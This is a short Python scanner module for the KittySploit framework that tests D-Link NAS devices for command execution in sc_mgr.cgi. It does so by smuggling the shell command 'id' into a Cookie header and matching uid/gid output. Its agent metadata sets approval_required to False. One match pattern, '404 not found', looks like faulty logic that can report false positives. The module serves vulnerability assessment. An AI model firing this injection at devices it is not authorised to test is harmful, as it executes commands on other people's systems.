#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The D-Link NAS interface sc_mgr."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link NAS `sc_mgr.cgi` - Remote Code Execution Detection',
        'description': 'The D-Link NAS interface sc_mgr.cgi contains a command execution vulnerability that allows attackers to execute arbitrary commands on the device, potentially leading to unauthorized access or control over the system.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'dlink', 'nas', 'rce', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
    }

    def run(self):
        path = '/cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Cookie': "username='& id &';"})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)', '404 not found',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='D-Link NAS `sc_mgr.cgi` - Remote Code Execution detected', path=path)
            return True
        return False

